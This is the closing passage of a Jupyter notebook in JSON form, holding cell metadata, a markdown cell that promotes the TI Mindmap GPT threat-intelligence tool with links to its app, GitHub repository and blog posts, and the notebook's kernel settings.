      "execution_count": 8,
      "metadata": {
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1705358218572
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "The features of this Jupyter Notebook will soon be added to the **TI Mindmap** tool. \n",
        "If you want to learn more:\n",
        "- Tool: [https://ti-mindmap-gpt.streamlit.app/](https://ti-mindmap-gpt.streamlit.app/)\n",
        "- GitHub: [https://github.com/format81/TI-Mindmap-GPT](https://github.com/format81/TI-Mindmap-GPT)\n",
        "- Blog posts:\n",
        "    - [Introducing TI Mindmap GPT](https://medium.com/@antonio.formato/introducing-ti-mindmap-gpt-6f433f140488)\n",
        "    - [Enhancing Cyber Threat Intelligence with TI Mindmap GPT: Integration of Azure OpenAI and advanced features](https://medium.com/microsoftazure/enhancing-cyber-threat-intelligence-with-ti-mindmap-gpt-integration-of-azure-openai-and-advanced-94121ed66ac4)\n",
        "\n",
        "<div style=\"color: Black; background-color: LightGreen; padding: 10px; font-size: 18px; line-height: 1.4;\">\n",
        "    <p>I hope you find this interesting. If you’ve found this Notebook useful, I invite you to contribute and add a star on GitHub and follow me on <a href=\"https://www.linkedin.com/in/antonioformato/\" style=\"color: #0077b5; text-decoration: underline;\" target=\"_blank\">LinkedIn</a>.</p>\n",
        "</div>\n",
        "\n"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python38-jupyter",
      "language": "python",
      "display_name": "Python 3.8 - Jupyter"
    },
    "language_info": {
      "name": "python",
      "version": "3.8.5",
      "mimetype": "text/x-python",
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    },
    "microsoft": {
      "ms_spell_check": {
        "ms_spell_check_language": "en"
      },
      "host": {
        "AzureML": {
          "notebookHasBeenCompleted": true
        }
      }
    },
    "kernel_info": {
      "name": "python38-jupyter"
    },
    "nteract": {
      "version": "nteract-front-end@1.0.0"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 2
}
